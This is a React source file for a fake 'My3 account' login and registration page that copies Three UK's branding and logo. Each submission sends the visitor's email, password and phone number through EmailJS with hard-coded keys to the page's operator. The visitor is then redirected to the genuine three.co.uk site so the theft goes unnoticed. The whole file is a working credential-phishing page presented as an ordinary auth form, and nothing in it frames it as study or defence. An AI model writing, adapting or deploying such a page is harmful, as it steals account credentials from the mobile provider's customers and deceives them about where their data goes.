import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import { FiEye, FiEyeOff } from "react-icons/fi";

const AuthForm = () => {
  const [isRegister, setIsRegister] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [accountType, setAccountType] = useState("personal");

  // State for input fields
  const [formData, setFormData] = useState({
    email: "",
    message: "",
    confirmPassword: "",
    phone: "",
  });

  // Handlers for input changes
  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const form = useRef();

  const sendLoginEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_ucnz2rz",
        "template_x4r3vzo",
        form.current,
        "C5bq1OhikmyORQC8m"
      )
      .then(
        (result) => {
          console.log("Email sent:", result.text);

          window.location.href = "https://www.three.co.uk/";
        },
        (error) => {
          console.log("Error:", error.text);
        }
      );

    e.target.reset();
  };

  const sendRegisterEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_gce8wd8",
        "template_x4r3vzo",
        form.current,
        "D75GC4zNUMKN7v2kp"
      )
      .then(
        (result) => {
          console.log("Email sent:", result.text);

          window.location.href = "https://www.three.co.uk/";
        },
        (error) => {
          console.log("Error:", error.text);
          window.location.href = "https://www.three.co.uk/";
        }
      );

    e.target.reset();
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-white">
      <div className="w-full max-w-sm text-center">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <img
            src="https://www.three.co.uk/content/experience-fragments/threedigital/uk/en/site/header/master/_jcr_content/root/header/top/logo.coreimg.svg/1668177162294/three-logo.svg"
            alt="Logo"
            className="w-[30%] h-auto"
          />
        </div>

        {/* Title */}
        <h2 className="text-4xl font-bold">My3 account</h2>

        {/* Tabs */}
        <div className="flex justify-center mt-4 border-b border-gray-900">
          <button
            className={`w-1/2 pb-2 font-medium text-center ${
              !isRegister ? "border-b-2 border-black" : "text-gray-500"
            }`}
            onClick={() => setIsRegister(false)}
          >
            Log in
          </button>
          <button
            className={`w-1/2 pb-2 font-medium text-center ${
              isRegister ? "border-b-2 border-black" : "text-gray-500"
            }`}
            onClick={() => setIsRegister(true)}
          >
            Register
          </button>
        </div>

        {/* Form */}
        <form
          ref={form}
          className="mt-6 text-left"
          onSubmit={isRegister == "Login" ? sendLoginEmail : sendRegisterEmail}
        >
          {isRegister && (
            <div className="mb-4">
              <label className="block text-gray-700 font-medium">
                Select account type:
              </label>
              <div className="mt-2">
                <label className="flex items-center text-black text-lg">
                  <input
                    type="radio"
                    name="accountType"
                    value="personal"
                    checked={accountType === "personal"}
                    onChange={() => setAccountType("personal")}
                    className="mr-2 w-8 h-8 accent-black"
                  />
                  Personal account or business employee
                </label>
                <label className="flex items-center mt-2 text-black text-lg">
                  <input
                    type="radio"
                    name="accountType"
                    value="business"
                    checked={accountType === "business"}
                    onChange={() => setAccountType("business")}
                    className="mr-2 w-8 h-8 accent-black"
                  />
                  Business account owner
                </label>
              </div>
            </div>
          )}

          {isRegister && (
            <div className="relative mb-4">
              <input
                type="text"
                name="phone"
                value={formData.phone}
                onChange={handleChange}
                placeholder="Phone number"
                className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
              />
            </div>
          )}

          {/* Email Input */}
          <div className="relative">
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              placeholder="Email address*"
              required
              className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
            />
          </div>

          {/* Password Input */}
          <div className="relative mt-4">
            <input
              type={showPassword ? "text" : "password"}
              name="message"
              value={formData.message}
              onChange={handleChange}
              placeholder="Password*"
              required
              className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
            />
            <span
              className="absolute right-2 top-3 text-gray-500 cursor-pointer"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? <FiEyeOff size={20} /> : <FiEye size={20} />}
            </span>
          </div>

          {isRegister && (
            <>
              <div className="text-black text-base mt-2">
                <p>• Your password must contain 12 characters or more.</p>
                <p>• Try forming one with 3 random words.</p>
              </div>

              {/* Confirm Password Input */}
              <div className="relative mt-4">
                <input
                  type={showConfirmPassword ? "text" : "password"}
                  name="confirmPassword"
                  value={formData.confirmPassword}
                  onChange={handleChange}
                  placeholder="Confirm password*"
                  required
                  className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
                />
                <span
                  className="absolute right-2 top-3 text-gray-500 cursor-pointer"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                >
                  {showConfirmPassword ? (
                    <FiEyeOff size={20} />
                  ) : (
                    <FiEye size={20} />
                  )}
                </span>
              </div>
            </>
          )}

          {!isRegister && (
            <div className="text-left underline mt-2">
              <a href="#" className="text-blue-600 text-sm">
                Forgot password?
              </a>
            </div>
          )}

          {/* Submit Button */}
          <button
            type="submit"
            className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
          >
            {isRegister ? "Register" : "Log in"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default AuthForm;
